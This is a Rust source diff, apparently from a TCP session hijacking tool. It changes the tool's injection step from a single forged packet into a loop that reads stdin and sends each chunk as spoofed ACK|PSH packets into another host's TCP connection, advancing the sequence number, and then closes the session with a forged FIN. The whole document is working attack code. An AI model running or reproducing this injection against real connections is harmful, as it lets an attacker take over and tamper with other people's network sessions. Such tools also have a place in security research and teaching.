@@ -68,19 +68,26 @@ fn run() -> Result<()> {
         seq += data.len() as u32;
     }
 
-    // get data for one packet
+    println!("Starting hijack session, Please use ^D to terminate.");
+    println!("Anything you enter from now on is sent to the hijacked TCP connection.");
+
     let mut stdin = io::stdin();
     let mut data = vec![0; 512];
-    let len = stdin.read(&mut data)?;
+    loop {
+        let len = stdin.read(&mut data)?;
 
-    let data = &data[..len];
+        if len == 0 {
+            break;
+        }
 
-    net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::PSH, seq, ack, &data);
+        net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::PSH, seq, ack, &data[..len]);
 
-    // bump seq afterwards
-    // seq += data.len() as u32;
+        // bump seq afterwards
+        seq += len as u32;
+    }
 
-    // close: TH_ACK | TH_FIN
+    net::sendtcp(&mut tx, &arguments.src, &arguments.dst, TcpFlags::ACK | TcpFlags::FIN, seq, ack, &[]);
+    println!("Exiting..");
 
     Ok(())
 }
